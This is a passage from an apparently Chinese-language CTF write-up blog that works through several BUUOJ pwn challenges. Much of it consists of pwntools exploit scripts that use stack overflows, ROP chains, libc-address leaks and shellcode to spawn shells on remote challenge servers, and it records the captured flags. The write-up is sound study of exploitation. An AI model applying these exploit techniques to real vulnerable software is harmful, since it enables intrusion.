remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27426</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;\x00&quot;</span> + <span class="string">&quot;\xff&quot;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;a&quot;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> </span><br><span class="line">payload2 += p32(write_plt) +p32(main)+ p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr=offset+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=offset+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload3 = <span class="string">&quot;a&quot;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload3 += p32(system_addr) + <span class="string">&quot;a&quot;</span>*<span class="number">4</span> + p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>放着！</p>
<p>来来来，2024.7.11，接着看一下</p>
<p>如题目一样要先绕过一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031457230.png" alt="image-20240712092140596"></p>
<p>如上思路一样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27986</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"><span class="comment">#params1</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr =<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">payload1 = <span class="string">b&quot;A&quot;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>)+ p32(write_plt) + p32(main_addr) +p32(<span class="number">1</span>)+ p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#构建一下libc</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload2 = flat([<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>),system_addr,main_addr,bin_sh])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>解决了</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031457955.png" alt="image-20240712095022407"></p>
<p>flag{d7610b4d-1471-4443-ba27-2c0f13dec95f}</p>
<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>2024.6.25</p>
<p>日常查壳</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031457928.png" alt="image-20240625155825261"></p>
<p>什么保护机制也没开，64位架构，扔进ida打开看看</p>
<p>找到溢出点，gets函数</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031457428.png" alt="image-20240625160139607"></p>
<p>确定一下溢出的长度为<strong>0x28</strong>，发现有没有system函数，猜测应该是要自己构建rop链来泄露libc，不会，上网看看</p>
<p>这里我们就是不知道要溢出到哪里？</p>
<p>所以我们是随便看看汇编指令，发现name参数存在全局变量bss段上，所以就溢出到着</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031458603.png" alt="image-20240625163838766"></p>
<p>构建exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26923</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)                   <span class="comment">#用来导入pwntools模块</span></span><br><span class="line">shellcode=asm(shellcraft.sh())                     <span class="comment">#利用pwntools模块自动生成shellcode</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tell me your name&#x27;</span>,shellcode)     <span class="comment">#往name中写入shellcode</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x601080</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;What do you want to say to me?&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26923</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;tell me your name&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x601080</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;What do you want to say to me?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>打通了，但是为什么查不到flag呢？</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031458628.png" alt="image-20240625180537943"></p>
<p>放着!</p>
<p><strong>okok，2024.7.11,回头看一手这个</strong></p>
<p>看了一下，感觉可以打ret2shellcode，name在bss段上</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607926.png" alt="image-20240711165721572"></p>
<p>找一下偏移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">sh = process(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;tell me your name&#x27;</span>)</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;What do you want to say to me?&#x27;</span>)</span><br><span class="line">name_addr=<span class="number">0x601080</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(name_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#显然打不通，不到为什么、</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么就planB</p>
<p>就是一个先利用puts函数泄露libc版本然后获得shell的题，amd64位架构</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031458725.png" alt="image-20240711164514644"></p>
<p>偏移找一下，上图和下图是一样的效果</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031458997.png" alt="image-20240711164620740"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29414</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi =<span class="number">0x0000000000400713</span> </span><br><span class="line">ret_addr=<span class="number">0x00000000004004c9</span></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;tell me your name\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;hhhh&quot;</span>)<span class="comment">#这里是随便写的</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say to me?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gets_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(gets_addr))</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031458236.png" alt="image-20240711173226149"></p>
<p>找一下libc版本</p>
<blockquote>
<p>0x7f0207bc49c0</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031458066.png" alt="image-20240711173559122"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_addr=<span class="number">0x809c0</span></span><br><span class="line">str_bin_sh=<span class="number">0x1b3e9a</span></span><br><span class="line">system_addr=<span class="number">0x4f440</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29414</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi =<span class="number">0x0000000000400713</span> </span><br><span class="line">ret_addr=<span class="number">0x00000000004004c9</span></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;tell me your name\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;hhhh&quot;</span>)<span class="comment">#这里是随便写的</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say to me?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gets_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(gets_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#params2</span></span><br><span class="line">puts_addr=<span class="number">0x809c0</span></span><br><span class="line">str_bin_sh=<span class="number">0x1b3e9a</span></span><br><span class="line">system_addr=<span class="number">0x4f440</span></span><br><span class="line"><span class="comment">#构建libc</span></span><br><span class="line">libcbase = gets_addr - puts_addr</span><br><span class="line">system_addr = libcbase + system_addr</span><br><span class="line">bin_sh = libcbase + str_bin_sh</span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>),ret_addr,pop_rdi,bin_sh,system_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>然后成功</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031458988.png" alt="image-20240711174338268"></p>
<p>flag{6b306e8d-be23-44ad-8490-7755da282bf2}</p>
<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>2024.6.25</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031458974.png" alt="image-20240625190519286"></p>
<p>NX保护，32位架构</p>
<p>打开之后发现，很明显的gets函数，</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031458589.png" alt="image-20240625190757445"></p>
<p>看一眼字符串，看见了flag.txt</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031458018.png" alt="image-20240625190907123"></p>
<p>看起来像一个后门函数，看一下这个函数的地址</p>
<p>​	<img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031458882.png" alt="image-20240625190956271"></p>
<p>感觉这样就行了，不知道要不要加其他的返回值什么的，先试一试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27113</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p32(<span class="number">0x80489A0</span>) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>发现不行，其实看一下就知道</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031459002.png" alt="image-20240625191738836"></p>
<p>传参从汇编代码看也不是直接压栈的，而是间接通过esp加减的方式。</p>
<p>所以只能通rop来执行命令了</p>
<p>看了一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031459289.png" alt="image-20240625193037422"></p>
<p>看一下它的地址，发现他在bss段上，问题就简单多了。0x80ECA2D</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031459047.png" alt="image-20240625193057470"></p>
<p>我们还需要一个输出函数和一个exit函数</p>
<p>printf函数如下：<strong>0x804F0A0</strong></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031459306.png" alt="image-20240625193644847"></p>
<p>exit()函数如下：<strong>0x804E660</strong></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031459038.png" alt="image-20240625193835311"></p>
<p>所以exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27113</span>)</span><br><span class="line">fl4g=<span class="number">0x80ECA2D</span></span><br><span class="line">printf=<span class="number">0x804F0A0</span></span><br><span class="line">eixt=<span class="number">0x804E660</span></span><br><span class="line">get_secret=<span class="number">0x80489A0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span> +p32(get_secret)+p32(printf)+p32(eixt)+p32(fl4g)</span><br><span class="line"><span class="comment">#没加ebp的原因是因为看一下汇编指令，里面没有pop ebp吗？</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031459638.png" alt="image-20240625201032223"></p>
<p>flag{4d6ba807-3dde-431d-9525-600906bcb1f5}</p>
<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>2024.6.26</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031459988.png" alt="image-20240626190524777"></p>
<p>NX保护，64架构，ida静态分析。</p>
<p>嗯~看着挺复杂的，但是一点也不简单</p>
<p>上来大概看一看，然后找找溢出点，很快就找到了gets函数</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031459259.png" alt="image-20240626192021838"></p>
<p>其实仔细在找找，就知道没有我们想要的system函数和bin&#x2F;sh，所以这里应该就是要libc泄露了，啊啊啊啊啊！</p>
<p>直接看一下他们的wp</p>
<p><strong>题目思路</strong></p>
<blockquote>
<ul>
<li>gets(s);存在栈溢出。</li>
<li>用\x00绕过strlen(s)，形成栈溢出。因为<code>strlen()</code>函数在遇到字符 ‘\0’（也就是空字符，字符值为0）时会立即退出。</li>
<li>泄露puts()地址，打常规ret2libc。</li>
</ul>
</blockquote>
<p>栈泄露还是能看的。确定一下溢出长度加上rbp的为<strong>0x58</strong>	</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031459644.png" alt="image-20240626194840957"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607927.png" alt="image-20240626194944085"></p>
<h3 id="泄露puts函数"><a href="#泄露puts函数" class="headerlink" title="泄露puts函数"></a>泄露puts函数</h3><p>然后呢，泄露puts的地址的话，就要找一下puts函数的地址,这里就是常规做法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r= remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29640</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;./ubuntu18(64).so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./1111&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">####</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">####</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]<span class="comment">##这个几个按理来说是一样的</span></span><br><span class="line">rdi_addr = <span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500985.png" alt="image-20240627120932300"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#attack1,这里是指要先通过栈溢出，绕过if条件</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>-<span class="number">1</span>)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"><span class="comment">##减一是因为前面的第一个字节占用了，而0x58如上所得。</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&quot;1&quot;</span>)<span class="comment">#输入1是因为要进入encrypt函数</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031500407.png" alt="image-20240627191219063"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r.recv()#接上</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">puts_addr = u64(r.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>



<p>完整的exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29640</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;./ubuntu18(64).so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./1111&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x400c83</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>-<span class="number">1</span>) +p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span 